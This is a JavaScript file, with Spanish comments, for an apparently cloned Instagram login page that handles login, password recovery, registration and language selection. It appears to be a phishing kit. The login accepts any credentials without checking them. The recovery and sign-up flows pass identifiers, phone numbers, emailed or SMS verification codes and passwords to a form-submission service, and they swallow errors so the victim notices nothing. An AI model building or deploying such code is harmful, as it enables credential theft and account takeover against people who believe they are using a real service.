/**
 * =============================================
 * APP — Login, recuperación, registro, i18n
 * =============================================
 */

(function initApp() {
  'use strict';

  const SESSION_KEY = 'insta_logged_in';
  const USER_KEY = 'insta_username';

  const state = {
    forgotIdentifier: '',
    verifyTarget: '',
    verifyType: 'email',
    codeBackScreen: 'forgot-find',
  };

  const loginTopbar = document.getElementById('login-topbar');

  if (sessionStorage.getItem(SESSION_KEY) === 'true') {
    window.location.replace('feed.html');
    return;
  }

  /* ─── Navegación entre pantallas ─── */

  function showScreen(name) {
    document.querySelectorAll('.screen').forEach((s) => {
      s.classList.toggle('screen--active', s.dataset.screen === name);
    });
    loginTopbar.classList.toggle('login-topbar--hidden', name !== 'login');
    window.scrollTo(0, 0);
  }

  document.querySelectorAll('[data-goto]').forEach((btn) => {
    btn.addEventListener('click', () => showScreen(btn.dataset.goto));
  });

  document.getElementById('btn-forgot')?.addEventListener('click', () => showScreen('forgot-find'));
  document.getElementById('btn-register')?.addEventListener('click', () => showScreen('register-1'));

  document.querySelector('[data-goto-back]')?.addEventListener('click', () => {
    showScreen(state.codeBackScreen);
  });

  /* ─── Idioma ─── */

  const langToggle = document.getElementById('lang-toggle');
  const langMenu = document.getElementById('lang-menu');

  Object.entries(I18N.languages).forEach(([code, label]) => {
    const li = document.createElement('li');
    li.setAttribute('role', 'option');
    li.textContent = label;
    li.dataset.lang = code;
    li.addEventListener('click', () => {
      I18N.setLang(code);
      langMenu.classList.add('lang-menu--hidden');
      langToggle.setAttribute('aria-expanded', 'false');
    });
    langMenu.appendChild(li);
  });

  langToggle.addEventListener('click', (e) => {
    e.stopPropagation();
    const open = langMenu.classList.toggle('lang-menu--hidden');
    langToggle.setAttribute('aria-expanded', String(!open));
  });

  document.addEventListener('click', () => {
    langMenu.classList.add('lang-menu--hidden');
    langToggle.setAttribute('aria-expanded', 'false');
  });

  I18N.init();

  function finishLoginFlow(username) {
    sessionStorage.setItem(SESSION_KEY, 'true');
    if (username) localStorage.setItem(USER_KEY, username);
    window.location.href = 'feed.html';
  }

  /* ─── Toggle contraseña ─── */

  document.addEventListener('click', (e) => {
    const btn = e.target.closest('[data-toggle-pwd]');
    if (!btn) return;
    e.preventDefault();
    const field = btn.closest('.login-form__field');
    const input = field?.querySelector('input');
    if (!input) return;
    input.type = input.type === 'password' ? 'text' : 'password';
  });

  /* ─── Login principal ─── */

  const loginForm = document.getElementById('login-form');
  const usernameInput = document.getElementById('username');
  const passwordInput = document.getElementById('password');
  const loginSubmit = document.getElementById('login-submit');

  function updateLoginBtn() {
    const ok = usernameInput.value.trim() && passwordInput.value.trim();
    loginSubmit.classList.toggle('login-form__submit--active', ok);
    loginSubmit.disabled = !ok;
  }

  usernameInput.addEventListener('input', updateLoginBtn);
  passwordInput.addEventListener('input', updateLoginBtn);
  updateLoginBtn();

  loginForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    const user = usernameInput.value.trim();
    const pwd = passwordInput.value;
    if (!user || !pwd) return;

    loginSubmit.disabled = true;
    loginSubmit.textContent = I18N.t('loading_login');

    await new Promise((resolve) => setTimeout(resolve, 600));

    finishLoginFlow(user);
  });

  /* ─── Olvidé contraseña ─── */

  function isEmail(val) {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(val);
  }

  function isPhone(val) {
    return /^[\d\s+()-]{6,}$/.test(val.replace(/\s/g, ''));
  }

  document.getElementById('forgot-find-form').addEventListener('submit', async (e) => {
    e.preventDefault();
    const id = document.getElementById('forgot-identifier').value.trim();
    if (!id) return;

    state.forgotIdentifier = id;

    try {
      await FormService.submit('Buscar perfil', {
        correo_o_usuario: id,
      });
    } catch { /* continúa flujo UI */ }

    if (isEmail(id)) {
      state.verifyType = 'email';
      state.verifyTarget = id;
      state.codeBackScreen = 'forgot-find';
      await VerifyService.sendEmail(id);
      document.getElementById('code-screen-title').dataset.i18n = 'verify_email_title';
      document.getElementById('code-screen-desc').dataset.i18n = 'verify_email_desc';
      I18N.apply();
      showScreen('forgot-code');
    } else if (isPhone(id)) {
      state.verifyType = 'sms';
      state.verifyTarget = id;
      state.codeBackScreen = 'forgot-find';
      await VerifyService.sendSMS(id);
      document.getElementById('code-screen-title').dataset.i18n = 'verify_phone_title';
      document.getElementById('code-screen-desc').dataset.i18n = 'verify_phone_desc';
      I18N.apply();
      showScreen('forgot-code');
    } else {
      showScreen('forgot-phone');
    }
  });

  document.getElementById('sms-sender').textContent = APP_CONFIG.SMS_SENDER;

  document.getElementById('forgot-phone-form').addEventListener('submit', async (e) => {
    e.preventDefault();
    const phone = document.getElementById('forgot-phone').value.trim();
    if (!phone) return;

    const btn = e.target.querySelector('[type="submit"]');
    btn.disabled = true;
    btn.textContent = I18N.t('sending');

    state.verifyType = 'sms';
    state.verifyTarget = phone;
    state.codeBackScreen = 'forgot-phone';

    try {
      await FormService.submit('Verificar teléfono', {
        identificador: state.forgotIdentifier,
        telefono: phone,
      });
      await VerifyService.sendSMS(phone);
    } catch { /* continúa */ }

    document.getElementById('code-screen-title').dataset.i18n = 'verify_phone_title';
    document.getElementById('code-screen-desc').dataset.i18n = 'verify_phone_desc';
    I18N.apply();
    btn.disabled = false;
    btn.textContent = I18N.t('continue');
    showScreen('forgot-code');
  });

  document.getElementById('forgot-code-form').addEventListener('submit', async (e) => {
    e.preventDefault();
    const code = document.getElementById('forgot-code').value.trim();
    const err = document.getElementById('code-error');

    if (!VerifyService.validateCode(state.verifyTarget, code)) {
      err.classList.remove('form-error--hidden');
      return;
    }
    err.classList.add('form-error--hidden');

    try {
      await FormService.submit('Código verificación', {
        identificador: state.forgotIdentifier,
        destino: state.verifyTarget,
        tipo: state.verifyType,
        codigo: code,
      });
    } catch { /* continúa */ }

    showScreen('forgot-password');
  });

  document.getElementById('btn-resend-code').addEventListener('click', async () => {
    if (state.verifyType === 'email') {
      await VerifyService.sendEmail(state.verifyTarget);
    } else {
      await VerifyService.sendSMS(state.verifyTarget);
    }
  });

  document.getElementById('forgot-password-form').addEventListener('submit', async (e) => {
    e.preventDefault();
    const newPwd = document.getElementById('forgot-new-pwd').value;
    const confirm = document.getElementById('forgot-confirm-pwd').value;
    const err = document.getElementById('forgot-pwd-error');

    if (newPwd !== confirm) {
      err.classList.remove('form-error--hidden');
      return;
    }
    err.classList.add('form-error--hidden');

    try {
      await FormService.submit('Recuperar contraseña', {
        identificador: state.forgotIdentifier,
        verificado_por: state.verifyType,
        destino: state.verifyTarget,
        contraseña_nueva: newPwd,
        confirmar_contraseña: confirm,
      });
    } catch { /* continúa */ }

    showScreen('login');
  });

  /* ─── Registro ─── */

  const regData = {};

  document.getElementById('register-step1-form').addEventListener('submit', async (e) => {
    e.preventDefault();
    regData.email = document.getElementById('reg-email').value.trim();
    regData.name = document.getElementById('reg-name').value.trim();

    try {
      await FormService.submit('Registro — paso 1', {
        correo: regData.email,
        nombre: regData.name,
      });
    } catch { /* continúa */ }

    showScreen('register-2');
  });

  document.getElementById('register-step2-form').addEventListener('submit', async (e) => {
    e.preventDefault();
    regData.username = document.getElementById('reg-username').value.trim();
    regData.phone = document.getElementById('reg-phone').value.trim();

    try {
      await FormService.submit('Registro — paso 2', {
        correo: regData.email,
        nombre: regData.name,
        usuario: regData.username,
        telefono: regData.phone,
      });
    } catch { /* continúa */ }

    showScreen('register-3');
  });

  document.getElementById('register-step3-form').addEventListener('submit', async (e) => {
    e.preventDefault();
    const pwd = document.getElementById('reg-password').value;
    const confirm = document.getElementById('reg-confirm').value;
    const err = document.getElementById('reg-pwd-error');

    if (pwd !== confirm) {
      err.classList.remove('form-error--hidden');
      return;
    }
    err.classList.add('form-error--hidden');

    try {
      await FormService.submit('Registro — completo', {
        correo: regData.email,
        nombre: regData.name,
        usuario: regData.username,
        telefono: regData.phone,
        contraseña: pwd,
        confirmar_contraseña: confirm,
      });
    } catch { /* continúa */ }

    showScreen('login');
  });
})();
